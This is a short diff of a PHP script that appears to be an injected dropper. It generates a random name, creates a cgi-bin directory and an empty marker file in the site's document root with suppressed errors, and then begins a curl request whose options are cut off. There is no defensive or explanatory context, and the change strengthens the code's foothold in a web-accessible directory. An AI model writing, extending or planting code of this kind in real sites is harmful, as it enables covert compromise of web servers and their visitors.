@@ -1,8 +1,10 @@
 <?php 
 $random = rand(1,6);
+$rand="ded";
 $d=$_SERVER['SERVER_NAME'];
-if(filesize('/tmp/gbbbb'.$d.$random)) { } else {
-	mkdir('/tmp/gbbbb'.$d.$random);
+if(filesize($_SERVER['DOCUMENT_ROOT']."/cgi-bin/".$random.$rand)) { } else {
+	 mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
+	@fopen($_SERVER['DOCUMENT_ROOT']."/cgi-bin/".$random.$rand, "w");
   $curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
